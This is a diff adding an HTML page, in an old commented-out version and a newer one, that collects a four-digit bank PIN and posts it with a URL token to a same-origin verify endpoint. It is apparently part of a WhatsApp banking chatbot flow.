@@ -1,0 +1,415 @@
+<!-- <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PIN Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background-color: white;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+        .form-group {
+            margin-bottom: 1rem;
+        }
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 0.5rem;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            padding: 0.75rem 1rem;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .error {
+            color: red;
+            margin-top: 1rem;
+            text-align: center;
+        }
+        .success {
+            color: green;
+            margin-top: 1rem;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2 style="text-align: center;">PIN Verification</h2>
+        <form id="verifyForm">
+            <div class="form-group">
+                <label for="secure_pin">Secure PIN:</label>
+                <input type="password" id="secure_pin" name="secure_pin" required>
+            </div>
+            <button type="submit">Verify PIN</button>
+        </form>
+        <div id="message"></div>
+    </div>
+
+    <script>
+        // Function to get URL parameters
+        function getUrlParameter(name) {
+            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+            var results = regex.exec(location.search);
+            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+        }
+
+        // Get token from URL when page loads
+        const token = getUrlParameter('token');
+
+        document.getElementById('verifyForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const messageDiv = document.getElementById('message');
+            
+            try {
+                const response = await fetch(`/api/verify-pin?token=${token}`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        secure_pin: document.getElementById('secure_pin').value
+                    })
+                });
+
+                const data = await response.json();
+                
+                if (response.ok) {
+                    messageDiv.className = 'success';
+                    messageDiv.textContent = 'PIN Sent successfully!, Inform the WhatsApp Agent';
+                } else {
+                    messageDiv.className = 'error';
+                    messageDiv.textContent = data.detail || 'Verification failed';
+                }
+            } catch (error) {
+                messageDiv.className = 'error';
+                messageDiv.textContent = 'An error occurred during verification';
+            }
+        });
+    </script>
+</body>
+</html> -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PIN Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f0e6ff;
+        }
+
+        .container {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 24px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.05);
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+
+        h1 {
+            color: #2d2d2d;
+            font-size: 28px;
+            margin-bottom: 48px;
+            font-weight: 600;
+        }
+
+        .pin-input-container {
+            display: flex;
+            gap: 16px;
+            justify-content: center;
+            margin-bottom: 32px;
+            padding: 0 20px;
+        }
+
+        .pin-input {
+            width: 56px;
+            height: 56px;
+            border: 1.5px solid #e8e8e8;
+            border-radius: 12px;
+            font-size: 24px;
+            text-align: center;
+            outline: none;
+            background: transparent;
+            transition: all 0.2s ease;
+        }
+
+        .pin-input:focus {
+            border-color: #6c63ff;
+            box-shadow: 0 0 0 3px rgba(108, 99, 255, 0.1);
+        }
+
+        .verify-button {
+            background-color: #6c63ff;
+            color: white;
+            border: none;
+            padding: 16px;
+            width: 100%;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .verify-button:hover {
+            background-color: #5b52e0;
+        }
+
+        .verify-button:disabled {
+            background-color: #a5a5a5;
+            cursor: not-allowed;
+        }
+
+        .message {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .success, .error {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .success {
+            background-color: #e8f5e9;
+            color: #2e7d32;
+            border: 1px solid #c8e6c9;
+        }
+
+        .error {
+            background-color: #ffebee;
+            color: #c62828;
+            border: 1px solid #ffcdd2;
+        }
+
+        .loader {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ffffff;
+            border-bottom-color: transparent;
+            border-radius: 50%;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: rotate 1s linear infinite;
+        }
+
+        @keyframes rotate {
+            from { transform: translate(-50%, -50%) rotate(0deg); }
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        .verify-button.loading {
+            color: transparent;
+        }
+
+        .verify-button.loading .loader {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>PIN Verification</h1>
+        <form id="verifyForm">
+            <div class="pin-input-container">
+                <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" required>
+                <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" required>
+                <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" required>
+                <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" required>
+            </div>
+            <button type="submit" class="verify-button">
+                <span class="button-text">Verify PIN</span>
+                <div class="loader"></div>
+            </button>
+            <p class="message">Please enter the 4-digit Bank pin</p>
+        </form>
+        <div id="success" class="success"></div>
+        <div id="error" class="error"></div>
+    </div>
+
+    <script>
+        // Get all required elements
+        const form = document.getElementById('verifyForm');
+        const inputs = document.querySelectorAll('.pin-input');
+        const button = form.querySelector('.verify-button');
+        const successDiv = document.getElementById('success');
+        const errorDiv = document.getElementById('error');
+
+        // Function to get URL parameters
+        function getUrlParameter(name) {
+            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+            var results = regex.exec(location.search);
+            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+        }
+
+        // Get token from URL
+        const token = getUrlParameter('token');
+
+        // Handle input navigation
+        inputs.forEach((input, index) => {
+            // Allow only numbers
+            input.addEventListener('input', (e) => {
+                if (e.target.value) {
+                    // Remove any non-digit characters
+                    e.target.value = e.target.value.replace(/\D/g, '');
+                    
+                    if (e.target.value) {
+                        // Move to next input if available
+                        if (index < inputs.length - 1) {
+                            inputs[index + 1].focus();
+                        }
+                    }
+                }
+            });
+
+            // Handle backspace
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+
+            // Handle paste
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const paste = (e.clipboardData || window.clipboardData).getData('text');
+                const numbers = paste.match(/\d/g);
+                
+                if (numbers) {
+                    numbers.forEach((number, i) => {
+                        if (index + i < inputs.length) {
+                            inputs[index + i].value = number;
+                        }
+                    });
+                    
+                    // Focus the appropriate input
+                    const nextIndex = Math.min(index + numbers.length, inputs.length - 1);
+                    inputs[nextIndex].focus();
+                }
+            });
+        });
+
+        // Show/hide message
+        function showMessage(type, message) {
+            successDiv.style.display = 'none';
+            errorDiv.style.display = 'none';
+
+            if (type === 'success') {
+                successDiv.textContent = message;
+                successDiv.style.display = 'block';
+            } else {
+                errorDiv.textContent = message;
+                errorDiv.style.display = 'block';
+            }
+        }
+
+        // Toggle loading state
+        function setLoading(isLoading) {
+            button.classList.toggle('loading', isLoading);
+            button.disabled = isLoading;
+            inputs.forEach(input => input.disabled = isLoading);
+        }
+
+        // Handle form submission
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            // Get PIN from inputs
+            const pin = Array.from(inputs).map(input => input.value).join('');
+
+            // Validate PIN
+            if (!/^\d{4}$/.test(pin)) {
+                showMessage('error', 'Please enter a valid 4-digit PIN');
+                return;
+            }
+
+            // Validate token
+            if (!token) {
+                showMessage('error', 'Missing verification link');
+                return;
+            }
+
+            try {
+                setLoading(true);
+                const response = await fetch(`/api/verify-pin?token=${token}`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    secure_pin: pin
+                })
+            });
+
+                const data = await response.json();
+                
+                if (response.ok) {
+                    showMessage('success', data.message || 'PIN Verified successfully! Check your whatsapp');
+                    form.reset();
+                } else {
+                    showMessage('error', data.error || 'Verification failed');
+                }
+            } catch (error) {
+                showMessage('error', 'An error occurred during verification');
+            } finally {
+                setLoading(false);
+            }
+        });
+    </script>
+</body>
+</html>
